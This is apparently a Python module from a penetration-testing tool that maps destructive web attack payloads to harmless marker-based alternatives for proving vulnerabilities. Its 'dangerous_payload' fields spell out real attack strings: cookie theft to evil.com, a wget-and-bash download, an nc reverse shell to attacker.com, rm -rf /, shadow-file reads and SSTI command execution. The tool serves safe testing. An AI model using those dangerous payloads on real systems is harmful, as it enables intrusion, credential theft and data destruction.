"""
Safe Payloads Generator - Non-destructive payload alternatives.
Provides evidence-only payloads for safe penetration testing.
"""

from __future__ import annotations

import hashlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

from utils.logger import get_logger

logger = get_logger(__name__)


class PayloadCategory(Enum):
    """Categories of security test payloads."""
    SQL_INJECTION = "sqli"
    XSS = "xss"
    COMMAND_INJECTION = "cmdi"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"
    SSRF = "ssrf"
    SSTI = "ssti"
    LDAP_INJECTION = "ldapi"
    NOSQL_INJECTION = "nosqli"
    HEADER_INJECTION = "header_injection"
    OPEN_REDIRECT = "open_redirect"
    IDOR = "idor"


@dataclass
class PayloadPair:
    """A pair of dangerous and safe equivalent payloads."""
    id: str
    category: PayloadCategory
    name: str
    dangerous_payload: str
    safe_payload: str
    evidence_markers: list[str]
    description: str
    risk_if_dangerous: str  # What would happen if dangerous was used
    safe_result: str  # What the safe payload proves
    
    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "category": self.category.value,
            "name": self.name,
            "dangerous_payload": self.dangerous_payload,
            "safe_payload": self.safe_payload,
            "evidence_markers": self.evidence_markers,
            "description": self.description,
        }


class SafePayloadGenerator:
    """
    Generate safe, non-destructive payloads for penetration testing.
    
    Philosophy:
    - Prove vulnerability exists WITHOUT causing damage
    - Use SELECT instead of DELETE/DROP
    - Use echo instead of rm
    - Use file:///dev/null instead of file:///etc/passwd
    - Use timing delays instead of data exfiltration
    
    Every dangerous payload has a safe alternative that proves
    the same vulnerability without the risk.
    """
    
    def __init__(self):
        self.payload_pairs: dict[PayloadCategory, list[PayloadPair]] = {}
        self._initialize_payloads()
    
    def _initialize_payloads(self) -> None:
        """Initialize all safe payload pairs."""
        self._init_sqli_payloads()
        self._init_xss_payloads()
        self._init_cmdi_payloads()
        self._init_path_traversal_payloads()
        self._init_xxe_payloads()
        self._init_ssrf_payloads()
        self._init_ssti_payloads()
        self._init_nosqli_payloads()
        self._init_header_injection_payloads()
        self._init_open_redirect_payloads()
    
    def _init_sqli_payloads(self) -> None:
        """SQL Injection - Safe alternatives."""
        self.payload_pairs[PayloadCategory.SQL_INJECTION] = [
            # Instead of data exfiltration
            PayloadPair(
                id="SQLI-001",
                category=PayloadCategory.SQL_INJECTION,
                name="Boolean-based blind (safe)",
                dangerous_payload="' OR 1=1; DROP TABLE users; --",
                safe_payload="' OR '1'='1",
                evidence_markers=["different response", "more results", "auth bypass"],
                description="Tests boolean-based SQL injection without data modification",
                risk_if_dangerous="Would delete entire users table",
                safe_result="Proves SQL injection exists via logic manipulation",
            ),
            PayloadPair(
                id="SQLI-002",
                category=PayloadCategory.SQL_INJECTION,
                name="Time-based blind (safe)",
                dangerous_payload="'; WAITFOR DELAY '0:0:10'; DROP TABLE users; --",
                safe_payload="'; WAITFOR DELAY '0:0:5'--",
                evidence_markers=["5 second delay", "response time > 5s"],
                description="Tests time-based blind SQL injection",
                risk_if_dangerous="Would delete users table after delay",
                safe_result="Proves injection via measurable time delay",
            ),
            PayloadPair(
                id="SQLI-003",
                category=PayloadCategory.SQL_INJECTION,
                name="Error-based (safe)",
                dangerous_payload="' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--",
                safe_payload="' AND 1=CONVERT(int,'test')--",
                evidence_markers=["SQL error", "conversion failed", "syntax error"],
                description="Triggers SQL error without extracting sensitive data",
                risk_if_dangerous="Would extract password from database",
                safe_result="Proves error-based injection via type conversion error",
            ),
            PayloadPair(
                id="SQLI-004",
                category=PayloadCategory.SQL_INJECTION,
                name="UNION-based count (safe)",
                dangerous_payload="' UNION SELECT password,credit_card FROM users--",
                safe_payload="' UNION SELECT NULL,NULL--",
                evidence_markers=["column count match", "union successful"],
                description="Tests UNION injection without extracting data",
                risk_if_dangerous="Would extract passwords and credit cards",
                safe_result="Proves UNION injection via null column matching",
            ),
            PayloadPair(
                id="SQLI-005",
                category=PayloadCategory.SQL_INJECTION,
                name="Stacked queries (safe)",
                dangerous_payload="'; DELETE FROM users WHERE 1=1; --",
                safe_payload="'; SELECT 1; --",
                evidence_markers=["query executed", "no error"],
                description="Tests stacked query support without data modification",
                risk_if_dangerous="Would delete all user records",
                safe_result="Proves stacked queries are supported",
            ),
            PayloadPair(
                id="SQLI-006",
                category=PayloadCategory.SQL_INJECTION,
                name="MySQL time-based (safe)",
                dangerous_payload="' OR SLEEP(10) AND DROP DATABASE production; #",
                safe_payload="' OR SLEEP(5)#",
                evidence_markers=["5 second delay", "MySQL sleep"],
                description="MySQL-specific time-based test",
                risk_if_dangerous="Would drop production database",
                safe_result="Proves MySQL injection via SLEEP function",
            ),
            PayloadPair(
                id="SQLI-007",
                category=PayloadCategory.SQL_INJECTION,
                name="PostgreSQL time-based (safe)",
                dangerous_payload="'; SELECT pg_sleep(10); DROP TABLE users; --",
                safe_payload="'; SELECT pg_sleep(5); --",
                evidence_markers=["5 second delay", "PostgreSQL"],
                description="PostgreSQL-specific time-based test",
                risk_if_dangerous="Would drop users table",
                safe_result="Proves PostgreSQL injection via pg_sleep",
            ),
        ]
    
    def _init_xss_payloads(self) -> None:
        """XSS - Safe alternatives that don't execute malicious code."""
        self.payload_pairs[PayloadCategory.XSS] = [
            PayloadPair(
                id="XSS-001",
                category=PayloadCategory.XSS,
                name="Reflected XSS (safe marker)",
                dangerous_payload="<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
                safe_payload="<script>console.log('XSS_MARKER_12345')</script>",
                evidence_markers=["XSS_MARKER_12345", "<script>", "reflected"],
                description="Tests script injection without cookie theft",
                risk_if_dangerous="Would steal session cookies",
                safe_result="Proves script execution via console marker",
            ),
            PayloadPair(
                id="XSS-002",
                category=PayloadCategory.XSS,
                name="Event handler XSS (safe)",
                dangerous_payload='<img src=x onerror="fetch(\'http://evil.com/?\'+document.cookie)">',
                safe_payload='<img src=x onerror="console.log(\'XSS_IMG_MARKER\')">',
                evidence_markers=["onerror", "XSS_IMG_MARKER", "reflected"],
                description="Tests event handler injection safely",
                risk_if_dangerous="Would exfiltrate cookies via fetch",
                safe_result="Proves event handler execution",
            ),
            PayloadPair(
                id="XSS-003",
                category=PayloadCategory.XSS,
                name="SVG XSS (safe)",
                dangerous_payload='<svg onload="new Image().src=\'http://evil.com/?\'+document.cookie">',
                safe_payload='<svg onload="console.log(\'XSS_SVG_MARKER\')">',
                evidence_markers=["<svg", "onload", "XSS_SVG_MARKER"],
                description="Tests SVG-based XSS safely",
                risk_if_dangerous="Would exfiltrate cookies via image",
                safe_result="Proves SVG event handler execution",
            ),
            PayloadPair(
                id="XSS-004",
                category=PayloadCategory.XSS,
                name="DOM XSS (safe)",
                dangerous_payload="javascript:alert(document.domain)//",
                safe_payload="javascript:void(console.log('XSS_DOM_TEST'))//",
                evidence_markers=["javascript:", "XSS_DOM_TEST"],
                description="Tests javascript: URI handler safely",
                risk_if_dangerous="Would reveal domain in alert",
                safe_result="Proves javascript: URI execution",
            ),
            PayloadPair(
                id="XSS-005",
                category=PayloadCategory.XSS,
                name="Attribute injection (safe)",
                dangerous_payload='" onfocus="fetch(\'http://evil.com\')" autofocus="',
                safe_payload='" onfocus="console.log(\'XSS_ATTR\')" autofocus="',
                evidence_markers=["onfocus", "autofocus", "XSS_ATTR"],
                description="Tests attribute-based XSS safely",
                risk_if_dangerous="Would make malicious request",
                safe_result="Proves attribute injection in HTML",
            ),
        ]
    
    def _init_cmdi_payloads(self) -> None:
        """Command Injection - Safe alternatives."""
        self.payload_pairs[PayloadCategory.COMMAND_INJECTION] = [
            PayloadPair(
                id="CMDI-001",
                category=PayloadCategory.COMMAND_INJECTION,
                name="Basic command injection (safe)",
                dangerous_payload="; rm -rf / --no-preserve-root",
                safe_payload="; echo 'CMDI_MARKER_001'",
                evidence_markers=["CMDI_MARKER_001", "echo"],
                description="Tests command injection without destruction",
                risk_if_dangerous="Would delete entire filesystem",
                safe_result="Proves command execution via echo output",
            ),
            PayloadPair(
                id="CMDI-002",
                category=PayloadCategory.COMMAND_INJECTION,
                name="Pipe injection (safe)",
                dangerous_payload="| cat /etc/shadow",
                safe_payload="| echo 'CMDI_PIPE_TEST'",
                evidence_markers=["CMDI_PIPE_TEST", "pipe"],
                description="Tests pipe command injection safely",
                risk_if_dangerous="Would reveal password hashes",
                safe_result="Proves pipe command works",
            ),
            PayloadPair(
                id="CMDI-003",
                category=PayloadCategory.COMMAND_INJECTION,
                name="Backtick injection (safe)",
                dangerous_payload="`wget http://evil.com/shell.sh | bash`",
                safe_payload="`echo 'CMDI_BACKTICK'`",
                evidence_markers=["CMDI_BACKTICK", "backtick"],
                description="Tests backtick command injection",
                risk_if_dangerous="Would download and execute shell",
                safe_result="Proves backtick execution",
            ),
            PayloadPair(
                id="CMDI-004",
                category=PayloadCategory.COMMAND_INJECTION,
                name="$() injection (safe)",
                dangerous_payload="$(nc -e /bin/bash attacker.com 4444)",
                safe_payload="$(echo 'CMDI_SUBSHELL')",
                evidence_markers=["CMDI_SUBSHELL", "subshell"],
                description="Tests $() subshell injection",
                risk_if_dangerous="Would open reverse shell",
                safe_result="Proves subshell execution",
            ),
            PayloadPair(
                id="CMDI-005",
                category=PayloadCategory.COMMAND_INJECTION,
                name="Windows command injection (safe)",
                dangerous_payload="& del /F /Q C:\\*",
                safe_payload="& echo CMDI_WIN_TEST",
                evidence_markers=["CMDI_WIN_TEST", "windows"],
                description="Tests Windows command injection",
                risk_if_dangerous="Would delete C: drive contents",
                safe_result="Proves Windows command execution",
            ),
            PayloadPair(
                id="CMDI-006",
                category=PayloadCategory.COMMAND_INJECTION,
                name="Time-based blind (safe)",
                dangerous_payload="; sleep 10; rm -rf /tmp/*",
                safe_payload="; sleep 5",
                evidence_markers=["5 second delay", "timing"],
                description="Tests blind command injection via timing",
                risk_if_dangerous="Would delete tmp files after delay",
                safe_result="Proves blind command execution via delay",
            ),
        ]
    
    def _init_path_traversal_payloads(self) -> None:
        """Path Traversal - Safe alternatives."""
        self.payload_pairs[PayloadCategory.PATH_TRAVERSAL] = [
            PayloadPair(
                id="PT-001",
                category=PayloadCategory.PATH_TRAVERSAL,
                name="Linux traversal (safe)",
                dangerous_payload="../../../../../../etc/shadow",
                safe_payload="../../../../../../etc/hostname",
                evidence_markers=["hostname", "traversal"],
                description="Tests path traversal with non-sensitive file",
                risk_if_dangerous="Would reveal password hashes",
                safe_result="Proves traversal via hostname file",
            ),
            PayloadPair(
                id="PT-002",
                category=PayloadCategory.PATH_TRAVERSAL,
                name="Windows traversal (safe)",
                dangerous_payload="..\\..\\..\\..\\Windows\\System32\\config\\SAM",
                safe_payload="..\\..\\..\\..\\Windows\\win.ini",
                evidence_markers=["win.ini", "[fonts]", "traversal"],
                description="Tests Windows path traversal safely",
                risk_if_dangerous="Would reveal SAM database",
                safe_result="Proves traversal via win.ini",
            ),
            PayloadPair(
                id="PT-003",
                category=PayloadCategory.PATH_TRAVERSAL,
                name="Null byte traversal (safe)",
                dangerous_payload="../../etc/passwd%00.jpg",
                safe_payload="../../etc/hostname%00.jpg",
                evidence_markers=["hostname", "null byte"],
                description="Tests null byte bypass safely",
                risk_if_dangerous="Would reveal passwd file",
                safe_result="Proves null byte bypass",
            ),
            PayloadPair(
                id="PT-004",
                category=PayloadCategory.PATH_TRAVERSAL,
                name="Double encoding (safe)",
                dangerous_payload="..%252f..%252f..%252fetc/shadow",
                safe_payload="..%252f..%252f..%252fetc/hostname",
                evidence_markers=["hostname", "double encoding"],
                description="Tests double URL encoding bypass",
                risk_if_dangerous="Would reveal shadow file",
                safe_result="Proves double encoding bypass",
            ),
        ]
    
    def _init_xxe_payloads(self) -> None:
        """XXE - Safe alternatives."""
        self.payload_pairs[PayloadCategory.XXE] = [
            PayloadPair(
                id="XXE-001",
                category=PayloadCategory.XXE,
                name="File read XXE (safe)",
                dangerous_payload='''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<data>&xxe;</data>''',
                safe_payload='''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/null">]>
<data>&xxe;</data>''',
                evidence_markers=["ENTITY", "SYSTEM", "XXE processed"],
                description="Tests XXE without reading sensitive files",
                risk_if_dangerous="Would reveal password hashes",
                safe_result="Proves XXE processing via /dev/null",
            ),
            PayloadPair(
                id="XXE-002",
                category=PayloadCategory.XXE,
                name="SSRF via XXE (safe)",
                dangerous_payload='''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>''',
                safe_payload='''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:1/">]>
<data>&xxe;</data>''',
                evidence_markers=["connection refused", "ENTITY", "localhost"],
                description="Tests XXE SSRF without AWS metadata access",
                risk_if_dangerous="Would reveal AWS credentials",
                safe_result="Proves SSRF capability via connection error",
            ),
            PayloadPair(
                id="XXE-003",
                category=PayloadCategory.XXE,
                name="Parameter entity XXE (safe)",
                dangerous_payload='''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>''',
                safe_payload='''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///dev/null">]>
<data>test</data>''',
                evidence_markers=["ENTITY", "parameter entity", "DTD"],
                description="Tests parameter entity XXE safely",
                risk_if_dangerous="Would load malicious DTD",
                safe_result="Proves parameter entity processing",
            ),
        ]
    
    def _init_ssrf_payloads(self) -> None:
        """SSRF - Safe alternatives."""
        self.payload_pairs[PayloadCategory.SSRF] = [
            PayloadPair(
                id="SSRF-001",
                category=PayloadCategory.SSRF,
                name="Cloud metadata SSRF (safe)",
                dangerous_payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                safe_payload="http://127.0.0.1:1/",
                evidence_markers=["connection refused", "localhost", "SSRF"],
                description="Tests SSRF without cloud metadata access",
                risk_if_dangerous="Would reveal IAM credentials",
                safe_result="Proves SSRF via localhost connection attempt",
            ),
            PayloadPair(
                id="SSRF-002",
                category=PayloadCategory.SSRF,
                name="Internal network SSRF (safe)",
                dangerous_payload="http://192.168.1.1/admin/",
                safe_payload="http://127.0.0.1:80/robots.txt",
                evidence_markers=["robots.txt", "localhost"],
                description="Tests internal SSRF safely",
                risk_if_dangerous="Would access internal admin panel",
                safe_result="Proves internal request capability",
            ),
            PayloadPair(
                id="SSRF-003",
                category=PayloadCategory.SSRF,
                name="File protocol SSRF (safe)",
                dangerous_payload="file:///etc/shadow",
                safe_payload="file:///etc/hostname",
                evidence_markers=["hostname", "file://"],
                description="Tests file:// protocol SSRF safely",
                risk_if_dangerous="Would reveal password hashes",
                safe_result="Proves file:// protocol access",
            ),
        ]
    
    def _init_ssti_payloads(self) -> None:
        """SSTI - Safe alternatives."""
        self.payload_pairs[PayloadCategory.SSTI] = [
            PayloadPair(
                id="SSTI-001",
                category=PayloadCategory.SSTI,
                name="Jinja2 SSTI (safe)",
                dangerous_payload="{{config.__class__.__init__.__globals__['os'].popen('rm -rf /').read()}}",
                safe_payload="{{7*7}}",
                evidence_markers=["49", "template evaluated"],
                description="Tests Jinja2 SSTI with math expression",
                risk_if_dangerous="Would delete filesystem",
                safe_result="Proves template injection via 7*7=49",
            ),
            PayloadPair(
                id="SSTI-002",
                category=PayloadCategory.SSTI,
                name="Twig SSTI (safe)",
                dangerous_payload="{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('rm -rf /')}}",
                safe_payload="{{7*'7'}}",
                evidence_markers=["7777777", "template evaluated"],
                description="Tests Twig SSTI with string multiplication",
                risk_if_dangerous="Would execute system commands",
                safe_result="Proves Twig injection via string multiplication",
            ),
            PayloadPair(
                id="SSTI-003",
                category=PayloadCategory.SSTI,
                name="Freemarker SSTI (safe)",
                dangerous_payload='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm -rf /")}',
                safe_payload="${7*7}",
                evidence_markers=["49", "freemarker"],
                description="Tests Freemarker SSTI safely",
                risk_if_dangerous="Would execute shell commands",
                safe_result="Proves Freemarker injection",
            ),
        ]
    
    def _init_nosqli_payloads(self) -> None:
        """NoSQL Injection - Safe alternatives."""
        self.payload_pairs[PayloadCategory.NOSQL_INJECTION] = [
            PayloadPair(
                id="NOSQL-001",
                category=PayloadCategory.NOSQL_INJECTION,
                name="MongoDB auth bypass (safe)",
                dangerous_payload='{"$ne": null, "$where": "db.dropDatabase()"}',
                safe_payload='{"$ne": null}',
                evidence_markers=["auth bypass", "no password required"],
                description="Tests MongoDB injection without DB deletion",
                risk_if_dangerous="Would drop entire database",
                safe_result="Proves NoSQL injection via $ne operator",
            ),
            PayloadPair(
                id="NOSQL-002",
                category=PayloadCategory.NOSQL_INJECTION,
                name="MongoDB regex (safe)",
                dangerous_payload='{"username": {"$regex": ".*"}, "$where": "sleep(10000)"}',
                safe_payload='{"username": {"$regex": "^a"}}',
                evidence_markers=["regex match", "users starting with a"],
                description="Tests regex injection safely",
                risk_if_dangerous="Would cause DoS via sleep",
                safe_result="Proves regex injection capability",
            ),
        ]
    
    def _init_header_injection_payloads(self) -> None:
        """Header Injection - Safe alternatives."""
        self.payload_pairs[PayloadCategory.HEADER_INJECTION] = [
            PayloadPair(
                id="HDR-001",
                category=PayloadCategory.HEADER_INJECTION,
                name="CRLF header injection (safe)",
                dangerous_payload="test\r\nSet-Cookie: admin=true\r\n",
                safe_payload="test\r\nX-Test: HEADER_INJECTION_MARKER\r\n",
                evidence_markers=["HEADER_INJECTION_MARKER", "X-Test", "new header"],
                description="Tests CRLF injection without cookie manipulation",
                risk_if_dangerous="Would set admin cookie",
                safe_result="Proves header injection via custom header",
            ),
            PayloadPair(
                id="HDR-002",
                category=PayloadCategory.HEADER_INJECTION,
                name="Host header injection (safe)",
                dangerous_payload="evil.com",
                safe_payload="localhost",
                evidence_markers=["localhost", "host header"],
                description="Tests host header injection safely",
                risk_if_dangerous="Would redirect to attacker site",
                safe_result="Proves host header can be manipulated",
            ),
        ]
    
    def _init_open_redirect_payloads(self) -> None:
        """Open Redirect - Safe alternatives."""
        self.payload_pairs[PayloadCategory.OPEN_REDIRECT] = [
            PayloadPair(
                id="REDIR-001",
                category=PayloadCategory.OPEN_REDIRECT,
                name="Open redirect (safe)",
                dangerous_payload="https://evil-phishing-site.com/steal-creds",
                safe_payload="https://example.com",
                evidence_markers=["redirect", "example.com", "Location header"],
                description="Tests open redirect with safe domain",
                risk_if_dangerous="Would redirect to phishing site",
                safe_result="Proves open redirect to external domain",
            ),
            PayloadPair(
                id="REDIR-002",
                category=PayloadCategory.OPEN_REDIRECT,
                name="Protocol-relative redirect (safe)",
                dangerous_payload="//evil.com/phish",
                safe_payload="//example.com",
                evidence_markers=["//example.com", "protocol-relative"],
                description="Tests protocol-relative redirect safely",
                risk_if_dangerous="Would redirect to attacker controlled site",
                safe_result="Proves protocol-relative redirect works",
            ),
        ]
    
    def get_safe_payload(
        self,
        category: PayloadCategory,
        payload_id: Optional[str] = None,
    ) -> Optional[PayloadPair]:
        """
        Get a safe payload by category and optional ID.
        
        Args:
            category: Type of payload
            payload_id: Specific payload ID (optional)
            
        Returns:
            PayloadPair if found, None otherwise
        """
        payloads = self.payload_pairs.get(category, [])
        
        if payload_id:
            for p in payloads:
                if p.id == payload_id:
                    return p
            return None
        
        # Return first payload for category
        return payloads[0] if payloads else None
    
    def get_all_safe_payloads(
        self,
        category: Optional[PayloadCategory] = None,
    ) -> list[PayloadPair]:
        """
        Get all safe payloads, optionally filtered by category.
        
        Args:
            category: Filter by category (optional)
            
        Returns:
            List of PayloadPair objects
        """
        if category:
            return self.payload_pairs.get(category, [])
        
        all_payloads = []
        for cat_payloads in self.payload_pairs.values():
            all_payloads.extend(cat_payloads)
        
        return all_payloads
    
    def convert_dangerous_to_safe(
        self,
        dangerous_payload: str,
        category: PayloadCategory,
    ) -> str:
        """
        Convert a dangerous payload to its safe alternative.
        
        Args:
            dangerous_payload: The dangerous payload to convert
            category: Category of the payload
            
        Returns:
            Safe alternative payload
        """
        payloads = self.payload_pairs.get(category, [])
        
        # Try to find exact match
        for p in payloads:
            if p.dangerous_payload == dangerous_payload:
                return p.safe_payload
        
        # Generate generic safe alternative
        return self._generate_generic_safe(dangerous_payload, category)
    
    def _generate_generic_safe(
        self,
        dangerous: str,
        category: PayloadCategory,
    ) -> str:
        """Generate a generic safe payload."""
        marker = hashlib.md5(dangerous.encode()).hexdigest()[:8]
        
        generic_safe = {
            PayloadCategory.SQL_INJECTION: f"' OR '1'='1' -- {marker}",
            PayloadCategory.XSS: f"<script>console.log('SAFE_{marker}')</script>",
            PayloadCategory.COMMAND_INJECTION: f"; echo 'SAFE_{marker}'",
            PayloadCategory.PATH_TRAVERSAL: "../../../../../../etc/hostname",
            PayloadCategory.XXE: f'<!ENTITY xxe_{marker} SYSTEM "file:///dev/null">',
            PayloadCategory.SSRF: "http://127.0.0.1:1/",
            PayloadCategory.SSTI: "{{7*7}}",
            PayloadCategory.NOSQL_INJECTION: '{"$ne": null}',
            PayloadCategory.HEADER_INJECTION: f"\r\nX-Safe-Test: {marker}\r\n",
            PayloadCategory.OPEN_REDIRECT: "https://example.com",
        }
        
        return generic_safe.get(category, f"SAFE_MARKER_{marker}")
    
    def get_payload_summary(self) -> dict[str, Any]:
        """Get summary of all available payloads."""
        summary = {
            "total_payloads": 0,
            "categories": {},
        }
        
        for category, payloads in self.payload_pairs.items():
            summary["categories"][category.value] = {
                "count": len(payloads),
                "payload_ids": [p.id for p in payloads],
            }
            summary["total_payloads"] += len(payloads)
        
        return summary
    
    def generate_test_suite(
        self,
        categories: Optional[list[PayloadCategory]] = None,
    ) -> list[dict]:
        """
        Generate a test suite of safe payloads.
        
        Args:
            categories: Categories to include (None = all)
            
        Returns:
            List of test case dictionaries
        """
        test_suite = []
        
        if categories is None:
            categories = list(PayloadCategory)
        
        for category in categories:
            payloads = self.payload_pairs.get(category, [])
            for payload in payloads:
                test_suite.append({
                    "id": payload.id,
                    "category": category.value,
                    "name": payload.name,
                    "payload": payload.safe_payload,
                    "expected_evidence": payload.evidence_markers,
                    "description": payload.description,
                })
        
        return test_suite
